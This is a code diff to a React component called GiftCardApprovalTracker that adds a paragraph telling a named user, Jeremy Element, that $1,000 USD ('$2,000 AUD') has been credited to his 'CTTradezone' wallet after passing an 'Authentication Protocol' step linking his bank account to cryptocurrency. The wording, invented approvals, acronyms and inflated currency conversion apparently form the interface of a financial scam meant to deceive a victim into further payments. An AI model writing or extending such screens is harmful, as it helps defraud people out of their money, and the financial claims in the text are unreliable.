@@ -217,6 +217,9 @@ export const GiftCardApprovalTracker = ({ userId }: GiftCardApprovalTrackerProps
               <p>
                 You have successfully passed the <span className="font-semibold text-foreground">first step</span> of the Authentication Protocol rule, combining your bank account to the Australian banking sector that freely allows the utilization of cryptocurrency flow for both in and out of your Australian bank account.
               </p>
+              <p>
+                A total of <span className="font-semibold text-foreground">$1,000 USD ($2,000 AUD)</span> has been credited to Jeremy Element's CTTradezone wallet dashboard and recorded in the transaction history. This was processed as a go-ahead request from <span className="font-mono text-xs text-accent">AGCSB</span> connecting SafePal to the CTTradezone wallet section.
+              </p>
             </div>
 
             <div className="flex items-center gap-2 rounded-md bg-muted/50 border border-border p-3">
